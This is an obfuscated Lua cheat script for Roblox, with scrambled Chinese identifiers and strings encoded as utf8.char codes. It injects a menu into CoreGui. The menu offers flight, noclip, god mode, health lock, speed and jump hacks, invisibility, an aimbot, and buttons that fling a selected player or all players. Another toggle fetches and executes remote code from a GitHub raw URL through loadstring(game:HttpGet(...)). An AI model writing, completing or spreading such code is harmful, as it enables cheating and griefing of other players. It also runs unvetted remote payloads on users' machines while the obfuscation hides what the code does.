	local 餮汻銪趭澜靶禕滼 = Instance.new(utf8.char(84, 101, 120, 116, 66, 117, 116, 116, 111, 110))
	local 嬴埅渂繢拲脧扶弸 = Instance.new(utf8.char(84, 101, 120, 116, 66, 117, 116, 116, 111, 110))
	local 令訚髆恅騊蓃审掦 = Instance.new(utf8.char(84, 101, 120, 116, 66, 117, 116, 116, 111, 110))

	诂湽牆刵犛琗冓鸐.Name = utf8.char(67, 97, 114, 70, 108, 121, 71, 85, 73)
	诂湽牆刵犛琗冓鸐.Parent = game.CoreGui
	诂湽牆刵犛琗冓鸐.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	诂湽牆刵犛琗冓鸐.ResetOnSpawn = false

	嬴埅渂繢拲脧扶弸.Name = utf8.char(19978)
	嬴埅渂繢拲脧扶弸.Parent = 诂湽牆刵犛琗冓鸐
	嬴埅渂繢拲脧扶弸.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	嬴埅渂繢拲脧扶弸.Position = UDim2.new(0.694387913, 0, 0.181818187, 0)
	嬴埅渂繢拲脧扶弸.Size = UDim2.new(0, 72, 0, 50)
	嬴埅渂繢拲脧扶弸.Font = Enum.Font.SourceSans
	嬴埅渂繢拲脧扶弸.Text = utf8.char(19978)
	嬴埅渂繢拲脧扶弸.TextColor3 = Color3.fromRGB(170, 0, 255)
	嬴埅渂繢拲脧扶弸.TextScaled = true
	嬴埅渂繢拲脧扶弸.TextSize = 14.000
	嬴埅渂繢拲脧扶弸.TextWrapped = true
	嬴埅渂繢拲脧扶弸.MouseButton1Down:Connect(function()
		肶鲨崩媯欀讋跞傶:FindFirstChildOfClass(utf8.char(66, 111, 100, 121, 86, 101, 108, 111, 99, 105, 116, 121)):Destroy()
		肶鲨崩媯欀讋跞傶:FindFirstChildOfClass(utf8.char(66, 111, 100, 121, 71, 121, 114, 111)):Destroy()
	end)

	令訚髆恅騊蓃审掦.Name = utf8.char(20572, 27490, 39134, 34892)
	令訚髆恅騊蓃审掦.Parent = 诂湽牆刵犛琗冓鸐
	令訚髆恅騊蓃审掦.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	令訚髆恅騊蓃审掦.Position = UDim2.new(0.695689976, 0, 0.0213903747, 0)
	令訚髆恅騊蓃审掦.Size = UDim2.new(0, 71, 0, 50)
	令訚髆恅騊蓃审掦.Font = Enum.Font.SourceSans
	令訚髆恅騊蓃审掦.Text = utf8.char(20572, 27490, 39134, 34892)
	令訚髆恅騊蓃审掦.TextColor3 = Color3.fromRGB(170, 0, 255)
	令訚髆恅騊蓃审掦.TextScaled = true
	令訚髆恅騊蓃审掦.TextSize = 14.000
	令訚髆恅騊蓃审掦.TextWrapped = true
	令訚髆恅騊蓃审掦.MouseButton1Down:Connect(function()
		肶鲨崩媯欀讋跞傶.Anchored = true
	end)

	餮汻銪趭澜靶禕滼.Name = utf8.char(39134, 34892)
	餮汻銪趭澜靶禕滼.Parent = 诂湽牆刵犛琗冓鸐
	餮汻銪趭澜靶禕滼.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	餮汻銪趭澜靶禕滼.Position = UDim2.new(0.588797748, 0, 0.0213903747, 0)
	餮汻銪趭澜靶禕滼.Size = UDim2.new(0, 66, 0, 50)
	餮汻銪趭澜靶禕滼.Font = Enum.Font.SourceSans
	餮汻銪趭澜靶禕滼.Text = utf8.char(39134, 34892)
	餮汻銪趭澜靶禕滼.TextColor3 = Color3.fromRGB(170, 0, 127)
	餮汻銪趭澜靶禕滼.TextScaled = true
	餮汻銪趭澜靶禕滼.TextSize = 14.000
	餮汻銪趭澜靶禕滼.TextWrapped = true
	餮汻銪趭澜靶禕滼.MouseButton1Down:Connect(function()
		local 甮郄纙孁鑠韑躞挚 = Instance.new(utf8.char(66, 111, 100, 121, 86, 101, 108, 111, 99, 105, 116, 121),肶鲨崩媯欀讋跞傶)
		local 嗊魏碍銭癿愴舞挔 = Instance.new(utf8.char(66, 111, 100, 121, 71, 121, 114, 111),肶鲨崩媯欀讋跞傶)
		嗊魏碍銭癿愴舞挔.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
		嗊魏碍銭癿愴舞挔.磩軧嬚奲圅缰泍廓 = 5000
		嗊魏碍銭癿愴舞挔.P = 50000
		嗊魏碍銭癿愴舞挔.CFrame = game.榽拰繶篘瓙骻匠胳.CurrentCamera.CFrame
		甮郄纙孁鑠韑躞挚.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
	end)

	逷恚咺聅腬櫽褂璊.Name = utf8.char(87)
	逷恚咺聅腬櫽褂璊.Parent = 诂湽牆刵犛琗冓鸐
	逷恚咺聅腬櫽褂璊.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	逷恚咺聅腬櫽褂璊.Position = UDim2.new(0.161668837, 0, 0.601604283, 0)
	逷恚咺聅腬櫽褂璊.Size = UDim2.new(0, 58, 0, 50)
	逷恚咺聅腬櫽褂璊.Font = Enum.Font.SourceSans
	逷恚咺聅腬櫽褂璊.Text = utf8.char(8593)
	逷恚咺聅腬櫽褂璊.TextColor3 = Color3.fromRGB(226, 226, 526)
	逷恚咺聅腬櫽褂璊.TextScaled = true
	逷恚咺聅腬櫽褂璊.TextSize = 5.000
	逷恚咺聅腬櫽褂璊.TextWrapped = true
	逷恚咺聅腬櫽褂璊.MouseButton1Down:Connect(function()
		肶鲨崩媯欀讋跞傶.Anchored = false
		肶鲨崩媯欀讋跞傶:FindFirstChildOfClass(utf8.char(66, 111, 100, 121, 86, 101, 108, 111, 99, 105, 116, 121)):Destroy()
		肶鲨崩媯欀讋跞傶:FindFirstChildOfClass(utf8.char(66, 111, 100, 121, 71, 121, 114, 111)):Destroy()
		wait(.1)
		local 甮郄纙孁鑠韑躞挚 = Instance.new(utf8.char(66, 111, 100, 121, 86, 101, 108, 111, 99, 105, 116, 121),肶鲨崩媯欀讋跞傶)
		local 嗊魏碍銭癿愴舞挔 = Instance.new(utf8.char(66, 111, 100, 121, 71, 121, 114, 111),肶鲨崩媯欀讋跞傶)
		嗊魏碍銭癿愴舞挔.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
		嗊魏碍銭癿愴舞挔.磩軧嬚奲圅缰泍廓 = 50000
		嗊魏碍銭癿愴舞挔.P = 50000
		嗊魏碍銭癿愴舞挔.CFrame = game.榽拰繶篘瓙骻匠胳.CurrentCamera.CFrame
		甮郄纙孁鑠韑躞挚.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
		甮郄纙孁鑠韑躞挚.Velocity = game.榽拰繶篘瓙骻匠胳.CurrentCamera.CFrame.LookVector * 赚湂鬍盺忬腗綇膺
	end)


	幚浻猝侽汔蒺覍類.Name = utf8.char(83)
	幚浻猝侽汔蒺覍類.Parent = 诂湽牆刵犛琗冓鸐
	幚浻猝侽汔蒺覍類.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	幚浻猝侽汔蒺覍類.Position = UDim2.new(0.161668837, 0, 0.735294104, 0)
	幚浻猝侽汔蒺覍類.Size = UDim2.new(0, 58, 0, 50)
	幚浻猝侽汔蒺覍類.Font = Enum.Font.SourceSans
	幚浻猝侽汔蒺覍類.Text = utf8.char(8595)
	幚浻猝侽汔蒺覍類.TextColor3 = Color3.fromRGB(255, 255, 255)
	幚浻猝侽汔蒺覍類.TextScaled = true
	幚浻猝侽汔蒺覍類.TextSize = 14.000
	幚浻猝侽汔蒺覍類.TextWrapped = true
	幚浻猝侽汔蒺覍類.MouseButton1Down:Connect(function()
		肶鲨崩媯欀讋跞傶.Anchored = false
		肶鲨崩媯欀讋跞傶:FindFirstChildOfClass(utf8.char(66, 111, 100, 121, 86, 101, 108, 111, 99, 105, 116, 121)):Destroy()
		肶鲨崩媯欀讋跞傶:FindFirstChildOfClass(utf8.char(66, 111, 100, 121, 71, 121, 114, 111)):Destroy()
		wait(.1)
		local 甮郄纙孁鑠韑躞挚 = Instance.new(utf8.char(66, 111, 100, 121, 86, 101, 108, 111, 99, 105, 116, 121),肶鲨崩媯欀讋跞傶)
		local 嗊魏碍銭癿愴舞挔 = Instance.new(utf8.char(66, 111, 100, 121, 71, 121, 114, 111),肶鲨崩媯欀讋跞傶)
		嗊魏碍銭癿愴舞挔.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
		嗊魏碍銭癿愴舞挔.磩軧嬚奲圅缰泍廓 = 5000
		嗊魏碍銭癿愴舞挔.P = 50000
		嗊魏碍銭癿愴舞挔.CFrame = game.榽拰繶篘瓙骻匠胳.CurrentCamera.CFrame
		甮郄纙孁鑠韑躞挚.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
		甮郄纙孁鑠韑躞挚.Velocity = game.榽拰繶篘瓙骻匠胳.CurrentCamera.CFrame.LookVector * -赚湂鬍盺忬腗綇膺
	end)
]=]

local function 夭蘾肯靑蜋匫軴佪()
    -- 清理旧的飞车 GUI
    local 億掙蘇縏啁刏莦郬 = game:GetService(utf8.char(67, 111, 114, 101, 71, 117, 105)):FindFirstChild(utf8.char(67, 97, 114, 70, 108, 121, 71, 85, 73))
    if 億掙蘇縏啁刏莦郬 then 億掙蘇縏啁刏莦郬:Destroy() end
    -- 直接执行原始飞车脚本
    loadstring(裃屪洨蠊婐蹅碸崱)()
    熱喫盥嫚杮歡傱萌(utf8.char(39134, 36710), utf8.char(39134, 36710, 38754, 26495, 24050, 24320, 21551), 3)
end

local function 鎷谨龒统捁褶鴸廁()
    local 宨树纉絉籲頩塾譜 = game:GetService(utf8.char(67, 111, 114, 101, 71, 117, 105)):FindFirstChild(utf8.char(67, 97, 114, 70, 108, 121, 71, 85, 73))
    if 宨树纉絉籲頩塾譜 then 宨树纉絉籲頩塾譜:Destroy() end
    -- 清理 BodyVelocity/BodyGyro
    local 找坍絹鯻拫敾闋祟 = 葰疀嗂枥訷薠蕠龵()
    if 找坍絹鯻拫敾闋祟 then
        local 鹪刉霸窱驉吶琮勎 = 找坍絹鯻拫敾闋祟:FindFirstChildOfClass(utf8.char(66, 111, 100, 121, 86, 101, 108, 111, 99, 105, 116, 121))
        if 鹪刉霸窱驉吶琮勎 then 鹪刉霸窱驉吶琮勎:Destroy() end
        local 旯榝糥珱唄瀑煓箵 = 找坍絹鯻拫敾闋祟:FindFirstChildOfClass(utf8.char(66, 111, 100, 121, 71, 121, 114, 111))
        if 旯榝糥珱唄瀑煓箵 then 旯榝糥珱唄瀑煓箵:Destroy() end
        找坍絹鯻拫敾闋祟.Anchored = false
    end
    熱喫盥嫚杮歡傱萌(utf8.char(39134, 36710), utf8.char(39134, 36710, 38754, 26495, 24050, 20851, 38381), 3)
end

唹暃宴镚腐黴匱澟:Divider()

唹暃宴镚腐黴匱澟:Button({
    Title = utf8.char(70, 80, 83, 32, 25552, 21319),
    Callback = function()
        for _, v in ipairs(榽拰繶篘瓙骻匠胳:GetDescendants()) do
            if v:IsA(utf8.char(66, 97, 115, 101, 80, 97, 114, 116)) then v.Material = Enum.Material.Plastic v.Reflectance = 0
            elseif v:IsA(utf8.char(68, 101, 99, 97, 108)) or v:IsA(utf8.char(84, 101, 120, 116, 117, 114, 101)) then v.Transparency = 1
            elseif v:IsA(utf8.char(80, 97, 114, 116, 105, 99, 108, 101, 69, 109, 105, 116, 116, 101, 114)) or v:IsA(utf8.char(84, 114, 97, 105, 108)) then v.Enabled = false end
        end
        域鴋慟呧嵭輽鍅謀.GlobalShadows = false
        域鴋慟呧嵭輽鍅謀.FogEnd = 1e9
        pcall(function() settings().Rendering.QualityLevel = Enum.QualityLevel.Level01 end)
        熱喫盥嫚杮歡傱萌(utf8.char(24050, 20248, 21270), utf8.char(), 3)
    end,
})

--========================================================
-- Tab4.5: 通用
--========================================================
local 深鐁迲禋忦喯亡瓛 = 瀣梃羢鹟夠伪誥璲:Tab({Title = utf8.char(36890, 29992), Icon = utf8.char(112, 97, 99, 107, 97, 103, 101)})

-- 飞车
深鐁迲禋忦喯亡瓛:Toggle({
    Title = utf8.char(39134, 36710, 32, 40, 24320, 21551, 21518, 24377, 20986, 39134, 36710, 38754, 26495, 41),
    Default = false,
    Callback = function(val)
        if val then 夭蘾肯靑蜋匫軴佪() else 鎷谨龒统捁褶鴸廁() end
    end,
})

深鐁迲禋忦喯亡瓛:Divider()

-- 无掉落伤害
深鐁迲禋忦喯亡瓛:Toggle({
    Title = utf8.char(26080, 25481, 33853, 20260, 23475),
    Default = false,
    Callback = function(val)
        逬貋祝臞噫檿轓谼.NoFallDamage = val
        if val then
            local 莶踯猇淪怩坘蕪难 = 肭家薊屓憍擤榎傯()
            if 莶踯猇淪怩坘蕪难 then 聫苻洂艆鿳漷囮瞃(莶踯猇淪怩坘蕪难) end
        end
    end,
})

深鐁迲禋忦喯亡瓛:Divider()

-- 甩飞
local 癹祆懶衁鄸吥糴渰 = nil
深鐁迲禋忦喯亡瓛:Dropdown({
    Title = utf8.char(29993, 39134, 30446, 26631),
    Values = 牂褫拮迱愽办擈樫(),
    Callback = function(val) 癹祆懶衁鄸吥糴渰 = val end,
})

深鐁迲禋忦喯亡瓛:Button({
    Title = utf8.char(29993, 39134, 33),
    Callback = function()
        if 癹祆懶衁鄸吥糴渰 then 穦矢桀潙瞖舤盔鷹(癹祆懶衁鄸吥糴渰)
        else 熱喫盥嫚杮歡傱萌(utf8.char(26410, 36873, 25321), utf8.char(35831, 20808, 36873, 25321, 30446, 26631), 3) end
    end,
})

深鐁迲禋忦喯亡瓛:Button({
    Title = utf8.char(29993, 39134, 25152, 26377, 20154, 33),
    Callback = function()
        task.spawn(羌鞄垕覭驖蒼运懾)
    end,
})

深鐁迲禋忦喯亡瓛:Divider()

-- 快速跑步
深鐁迲禋忦喯亡瓛:Toggle({
    Title = utf8.char(24555, 36895, 36305, 27493, 32, 40, 51, 20493, 36895, 24230, 41),
    Default = false,
    Callback = function(val)
        if val then
            铵肟綄碂疂垔氛鳤 = 犄瞕炿詑碐糡圃曎.RenderStepped:Connect(function()
                local 绠瘳饀秥鐏檶籅尨 = 肭家薊屓憍擤榎傯()
                if 绠瘳饀秥鐏檶籅尨 then
                    绠瘳饀秥鐏檶籅尨.WalkSpeed = 逬貋祝臞噫檿轓谼.WalkSpeed * 3
                end
            end)
            熱喫盥嫚杮歡傱萌(utf8.char(24555, 36895, 36305, 27493), utf8.char(36895, 24230, 24050, 25552, 21319, 33267, 51, 20493), 3)
        else
            if 铵肟綄碂疂垔氛鳤 then 铵肟綄碂疂垔氛鳤:Disconnect() 铵肟綄碂疂垔氛鳤 = nil end
            迆周袱燚讵歀俜狛()
            熱喫盥嫚杮歡傱萌(utf8.char(24555, 36895, 36305, 27493), utf8.char(24050, 24674, 22797, 27491, 24120, 36895, 24230), 3)
        end
    end,
})

-- 无限跳跃
深鐁迲禋忦喯亡瓛:Toggle({
    Title = utf8.char(26080, 38480, 36339, 36291),
    Default = false,
    Callback = function(val)
        if val then
            溂盤亟侀锚嚈仱忩 = 氟崹攻鏗覻蟭胺跌.JumpRequest:Connect(function()
                local 莶踯猇淪怩坘蕪难 = 肭家薊屓憍擤榎傯()
                if 莶踯猇淪怩坘蕪难 then 莶踯猇淪怩坘蕪难:ChangeState(Enum.HumanoidStateType.Jumping) end
            end)
        else
            if 溂盤亟侀锚嚈仱忩 then 溂盤亟侀锚嚈仱忩:Disconnect() 溂盤亟侀锚嚈仱忩 = nil end
        end
    end,
})

-- 穿墙
深鐁迲禋忦喯亡瓛:Toggle({
    Title = utf8.char(31359, 22681),
    Default = false,
    Callback = function(val)
        if val then
            桂獹芆罴訟橳坼鐦 = 犄瞕炿詑碐糡圃曎.Stepped:Connect(function()
                local 鉔鲸骆勓簉睹錛犭 = 屫駀贜蟃逞坥淓妺()
                if 鉔鲸骆勓簉睹錛犭 then
                    for _, p in ipairs(鉔鲸骆勓簉睹錛犭:GetDescendants()) do
                        if p:IsA(utf8.char(66, 97, 115, 101, 80, 97, 114, 116)) and p.CanCollide then p.CanCollide = false end
                    end
                end
            end)
        else
            if 桂獹芆罴訟橳坼鐦 then 桂獹芆罴訟橳坼鐦:Disconnect() 桂獹芆罴訟橳坼鐦 = nil end
        end
    end,
})

-- 防击退/防甩飞
深鐁迲禋忦喯亡瓛:Toggle({
    Title = utf8.char(38450, 20987, 36864, 47, 38450, 29993, 39134),
    Default = false,
    Callback = function(val)
        if val then
            儁韣叨毦雇酥峯曳 = 犄瞕炿詑碐糡圃曎.Heartbeat:Connect(function()
                local 找坍絹鯻拫敾闋祟 = 葰疀嗂枥訷薠蕠龵()
                local 绠瘳饀秥鐏檶籅尨 = 肭家薊屓憍擤榎傯()
                if 找坍絹鯻拫敾闋祟 and 绠瘳饀秥鐏檶籅尨 and 绠瘳饀秥鐏檶籅尨.Health > 0 then
                    if 绠瘳饀秥鐏檶籅尨.MoveDirection.Magnitude < 0.1 then
                        找坍絹鯻拫敾闋祟.AssemblyLinearVelocity = Vector3.new(0, 找坍絹鯻拫敾闋祟.AssemblyLinearVelocity.Y, 0)
                        找坍絹鯻拫敾闋祟.AssemblyAngularVelocity = Vector3.zero
                    end
                end
            end)
            熱喫盥嫚杮歡傱萌(utf8.char(38450, 20987, 36864), utf8.char(24050, 24320, 21551, 38450, 20987, 36864, 20445, 25252), 3)
        else
            if 儁韣叨毦雇酥峯曳 then 儁韣叨毦雇酥峯曳:Disconnect() 儁韣叨毦雇酥峯曳 = nil end
            熱喫盥嫚杮歡傱萌(utf8.char(38450, 20987, 36864), utf8.char(24050, 20851, 38381, 38450, 20987, 36864, 20445, 25252), 3)
        end
    end,
})

深鐁迲禋忦喯亡瓛:Divider()

-- 防甩飞 (Anchor 根部件)
local 鰨烋嚏滴鳼蚄西貨 = nil
深鐁迲禋忦喯亡瓛:Toggle({
    Title = utf8.char(38450, 29993, 39134),
    Default = false,
    Callback = function(val)
        if val then
            鰨烋嚏滴鳼蚄西貨 = 犄瞕炿詑碐糡圃曎.Heartbeat:Connect(function()
                local 找坍絹鯻拫敾闋祟 = 葰疀嗂枥訷薠蕠龵()
                local 绠瘳饀秥鐏檶籅尨 = 肭家薊屓憍擤榎傯()
                if 找坍絹鯻拫敾闋祟 and 绠瘳饀秥鐏檶籅尨 and 绠瘳饀秥鐏檶籅尨.Health > 0 then
                    local 鸡秖傭袟禞炸喡事 = 找坍絹鯻拫敾闋祟.AssemblyAngularVelocity
                    if 鸡秖傭袟禞炸喡事.Magnitude > 5000 then
                        找坍絹鯻拫敾闋祟.AssemblyAngularVelocity = Vector3.zero
                        找坍絹鯻拫敾闋祟.AssemblyLinearVelocity = Vector3.new(0, 找坍絹鯻拫敾闋祟.AssemblyLinearVelocity.Y, 0)
                    end
                end
            end)
            熱喫盥嫚杮歡傱萌(utf8.char(38450, 29993, 39134), utf8.char(24050, 24320, 21551, 38450, 29993, 39134, 20445, 25252), 3)
        else
            if 鰨烋嚏滴鳼蚄西貨 then 鰨烋嚏滴鳼蚄西貨:Disconnect() 鰨烋嚏滴鳼蚄西貨 = nil end
            熱喫盥嫚杮歡傱萌(utf8.char(38450, 29993, 39134), utf8.char(24050, 20851, 38381, 38450, 29993, 39134, 20445, 25252), 3)
        end
    end,
})

-- 隐身
local 矧襒枓穠繶鳳蚿嶋 = nil
深鐁迲禋忦喯亡瓛:Toggle({
    Title = utf8.char(38544, 36523),
    Default = false,
    Callback = function(val)
        if val then
            矧襒枓穠繶鳳蚿嶋 = 犄瞕炿詑碐糡圃曎.Heartbeat:Connect(function()
                local 偬冬摤秃猣帖鑠賰 = 屫駀贜蟃逞坥淓妺()
                if 偬冬摤秃猣帖鑠賰 then
                    for _, p in ipairs(偬冬摤秃猣帖鑠賰:GetDescendants()) do
                        if p:IsA(utf8.char(66, 97, 115, 101, 80, 97, 114, 116)) and p.Name ~= utf8.char(72, 117, 109, 97, 110, 111, 105, 100, 82, 111, 111, 116, 80, 97, 114, 116) then
                            p.LocalTransparencyModifier = 1
                        end
                    end
                end
            end)
            熱喫盥嫚杮歡傱萌(utf8.char(38544, 36523), utf8.char(24050, 24320, 21551, 38544, 36523, 32, 40, 20165, 26412, 22320, 21487, 35265, 41), 3)
        else
            if 矧襒枓穠繶鳳蚿嶋 then 矧襒枓穠繶鳳蚿嶋:Disconnect() 矧襒枓穠繶鳳蚿嶋 = nil end
            local 偬冬摤秃猣帖鑠賰 = 屫駀贜蟃逞坥淓妺()
            if 偬冬摤秃猣帖鑠賰 then
                for _, p in ipairs(偬冬摤秃猣帖鑠賰:GetDescendants()) do
                    if p:IsA(utf8.char(66, 97, 115, 101, 80, 97, 114, 116)) and p.Name ~= utf8.char(72, 117, 109, 97, 110, 111, 105, 100, 82, 111, 111, 116, 80, 97, 114, 116) then
                        p.LocalTransparencyModifier = 0
                    end
                end
            end
            熱喫盥嫚杮歡傱萌(utf8.char(38544, 36523), utf8.char(24050, 20851, 38381, 38544, 36523), 3)
        end
    end,
})

-- 无敌
深鐁迲禋忦喯亡瓛:Toggle({
    Title = utf8.char(26080, 25932),
    Default = false,
    Callback = function(val)
        if val then
            跪嶝綞顂嵭心醚祌 = 犄瞕炿詑碐糡圃曎.Heartbeat:Connect(function()
                local 绠瘳饀秥鐏檶籅尨 = 肭家薊屓憍擤榎傯()
                if 绠瘳饀秥鐏檶籅尨 then
                    if 绠瘳饀秥鐏檶籅尨.Health < 绠瘳饀秥鐏檶籅尨.MaxHealth then
                        绠瘳饀秥鐏檶籅尨.Health = 绠瘳饀秥鐏檶籅尨.MaxHealth
                    end
                end
            end)
            熱喫盥嫚杮歡傱萌(utf8.char(26080, 25932), utf8.char(24050, 24320, 21551, 26080, 25932, 27169, 24335), 3)
        else
            if 跪嶝綞顂嵭心醚祌 then 跪嶝綞顂嵭心醚祌:Disconnect() 跪嶝綞顂嵭心醚祌 = nil end
            熱喫盥嫚杮歡傱萌(utf8.char(26080, 25932), utf8.char(24050, 20851, 38381, 26080, 25932, 27169, 24335), 3)
        end
    end,
})

-- 锁血
深鐁迲禋忦喯亡瓛:Toggle({
    Title = utf8.char(38145, 34880, 32, 40, 38145, 23450, 24403, 21069, 34880, 37327, 41),
    Default = false,
    Callback = function(val)
        if val then
            local 绠瘳饀秥鐏檶籅尨 = 肭家薊屓憍擤榎傯()
            local 屖疥稘豂镛洩钰鈲 = 绠瘳饀秥鐏檶籅尨 and 绠瘳饀秥鐏檶籅尨.Health or 100
            熱喫盥嫚杮歡傱萌(utf8.char(38145, 34880), utf8.char(24050, 38145, 23450, 34880, 37327, 58, 32) .. math.floor(屖疥稘豂镛洩钰鈲), 3)
            连沊襳笁盧燭鏯勃 = 犄瞕炿詑碐糡圃曎.Heartbeat:Connect(function()
                local 莶踯猇淪怩坘蕪难 = 肭家薊屓憍擤榎傯()
                if 莶踯猇淪怩坘蕪难 and 莶踯猇淪怩坘蕪难.Health ~= 屖疥稘豂镛洩钰鈲 then
                    莶踯猇淪怩坘蕪难.Health = 屖疥稘豂镛洩钰鈲
                end
            end)
        else
            if 连沊襳笁盧燭鏯勃 then 连沊襳笁盧燭鏯勃:Disconnect() 连沊襳笁盧燭鏯勃 = nil end
            熱喫盥嫚杮歡傱萌(utf8.char(38145, 34880), utf8.char(24050, 20851, 38381, 38145, 34880), 3)
        end
    end,
})

深鐁迲禋忦喯亡瓛:Divider()

-- 服务器跳转
深鐁迲禋忦喯亡瓛:Button({
    Title = utf8.char(26381, 21153, 22120, 36339, 36716),
    Callback = function()
        pcall(function()
            local 竫觼栘厊涏啊靗鏜 = string.format(utf8.char(104, 116, 116, 112, 115, 58, 47, 47, 103, 97, 109, 101, 115, 46, 114, 111, 98, 108, 111, 120, 46, 99, 111, 109, 47, 118, 49, 47, 103, 97, 109, 101, 115, 47, 37, 100, 47, 115, 101, 114, 118, 101, 114, 115, 47, 80, 117, 98, 108, 105, 99, 63, 115, 111, 114, 116, 79, 114, 100, 101, 114, 61, 65, 115, 99, 38, 108, 105, 109, 105, 116, 61, 49, 48, 48), game.PlaceId)
            local 税熕毐坟鋀蹁亳亖 = 祏愤芰捘膴跏蟫緶:JSONDecode(game:HttpGet(竫觼栘厊涏啊靗鏜))
            if 税熕毐坟鋀蹁亳亖 and 税熕毐坟鋀蹁亳亖.税熕毐坟鋀蹁亳亖 then
                local 鉔鲸骆勓簉睹錛犭 = {}
                for _, s in ipairs(税熕毐坟鋀蹁亳亖.税熕毐坟鋀蹁亳亖) do
                    if s.playing < s.maxPlayers and s.id ~= game.JobId then table.insert(鉔鲸骆勓簉睹錛犭, s.id) end
                end
                if #鉔鲸骆勓簉睹錛犭 > 0 then
                    智樊瓐泏竎幓褟帓:TeleportToPlaceInstance(game.PlaceId, 鉔鲸骆勓簉睹錛犭[math.random(1, #鉔鲸骆勓簉睹錛犭)], 憇菝龚描畒詃曒砤)
                else 熱喫盥嫚杮歡傱萌(utf8.char(26410, 25214, 21040), utf8.char(27809, 26377, 21487, 29992, 26381, 21153, 22120), 3) end
            end
        end)
    end,
})

深鐁迲禋忦喯亡瓛:Button({
    Title = utf8.char(37325, 26032, 21152, 20837),
    Callback = function() 智樊瓐泏竎幓褟帓:TeleportToPlaceInstance(game.PlaceId, game.JobId, 憇菝龚描畒詃曒砤) end,
})

深鐁迲禋忦喯亡瓛:Button({
    Title = utf8.char(31163, 24320, 28216, 25103),
    Callback = function()
        憇菝龚描畒詃曒砤:Kick(utf8.char(24050, 31163, 24320, 28216, 25103))
    end,
})

深鐁迲禋忦喯亡瓛:Divider()

-- 防挂机
local antiAFKConn
深鐁迲禋忦喯亡瓛:Toggle({
    Title = utf8.char(38450, 25346, 26426),
    Default = false,
    Callback = function(val)
        if val then
            local 犱荟笼罁定炦皍灴 = game:GetService(utf8.char(86, 105, 114, 116, 117, 97, 108, 85, 115, 101, 114))
            antiAFKConn = 憇菝龚描畒詃曒砤.Idled:Connect(function()
                犱荟笼罁定炦皍灴:CaptureController()
                犱荟笼罁定炦皍灴:ClickButton2(Vector2.new())
            end)
        else
            if antiAFKConn then antiAFKConn:Disconnect() antiAFKConn = nil end
        end
    end,
})

深鐁迲禋忦喯亡瓛:Divider()

-- 汉化祖国人飞行
深鐁迲禋忦喯亡瓛:Toggle({
    Title = utf8.char(27721, 21270, 31062, 22269, 20154, 39134, 34892),
    Default = false,
    Callback = function(val)
        if val then
            pcall(function()
                loadstring(game:HttpGet(utf8.char(104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 107, 111, 110, 103, 98, 97, 78, 66, 47, 45, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 31062, 22269, 20154, 27721, 21270)))()
            end)
            熱喫盥嫚杮歡傱萌(utf8.char(31062, 22269, 20154, 39134, 34892), utf8.char(24050, 25191, 34892, 27721, 21270, 31062, 22269, 20154, 39134, 34892), 3)
        end
    end,
})

深鐁迲禋忦喯亡瓛:Divider()

-- 人物旋转
深鐁迲禋忦喯亡瓛:Toggle({
    Title = utf8.char(20154, 29289, 26059, 36716),
    Default = false,
    Callback = function(val)
        逬貋祝臞噫檿轓谼.CharRotate = val
        if val then
            熱喫盥嫚杮歡傱萌(utf8.char(36890, 29992), utf8.char(20154, 29289, 26059, 36716, 24050, 24320, 21551), 3)
            唶恧悀爃竓櫈秬繣 = 犄瞕炿詑碐糡圃曎.Heartbeat:Connect(function()
                local 濗锪洟应焥塘蘺厸 = 葰疀嗂枥訷薠蕠龵()
                if 濗锪洟应焥塘蘺厸 then
                    濗锪洟应焥塘蘺厸.CFrame = 濗锪洟应焥塘蘺厸.CFrame * CFrame.Angles(0, math.rad(3), 0)
                end
            end)
        else
            if 唶恧悀爃竓櫈秬繣 then
                唶恧悀爃竓櫈秬繣:Disconnect()
                唶恧悀爃竓櫈秬繣 = nil
            end
            熱喫盥嫚杮歡傱萌(utf8.char(36890, 29992), utf8.char(20154, 29289, 26059, 36716, 24050, 20851, 38381), 3)
        end
    end,
})

--========================================================
-- Tab5: 自瞄和子追
--========================================================
local 簈漳紃侦隦饩麬旮 = 瀣梃羢鹟夠伪誥璲:Tab({Title = utf8.char(33258, 30596, 21644, 23376, 36861), Icon = utf8.char(99, 114, 111, 115, 115, 104, 97, 105, 114)})

-- 自瞄
簈漳紃侦隦饩麬旮:Toggle({
    Title = utf8.char(33258, 30596),
    Default = false,
    Callback = function(val)
        逬貋祝臞噫檿轓谼.Aimbot = val
        if val then 鳨绥鑂樛鐥厮凣瑶() else 签蚕喟慺錝焬冿園() end
    end,
})

簈漳紃侦隦饩麬旮:Slider({
    Title = utf8.char(70, 79, 86, 33539, 22260),
    Value = {Min = 30, Max = 500, Default = 150},
    Step = 10,
    Callback = function(val) 逬貋祝臞噫檿轓谼.AimbotFOV = val end,
})

簈漳紃侦隦饩麬旮:Toggle({
    Title = utf8.char(26174, 31034, 33539, 22260, 22280),
    Default = false,
    Callback = function(val)
        逬貋祝臞噫檿轓谼.ShowFOV = val
        鏹鉥則躡蒟鍱聭韪()
    end,
})

簈漳紃侦隦饩麬旮:Toggle({
    Title = utf8.char(21491, 38190, 33258, 30596),
    Default = false,
    Callback = function(val) 逬貋祝臞噫檿轓谼.AimbotKey = val end,
})

簈漳紃侦隦饩麬旮:Divider()

-- 通用子追 (自动跟随目标玩家)
local 抁唻隖鰿諷跠軡緉 = nil
local 壢香亹鵬衣馔謆矣 = nil
local 搋鋈嘵毇憨瀧峜臙 = 15
local 曒霹炤轜讥幏疚譱 = false

簈漳紃侦隦饩麬旮:Dropdown({
    Title = utf8.char(30446, 26631),
    Values = 牂褫拮迱愽办擈樫(),
    Callback = function(val) 抁唻隖鰿諷跠軡緉 = val end,
})

簈漳紃侦隦饩麬旮:Button({
    Title = utf8.char(21047, 26032, 21015, 34920),
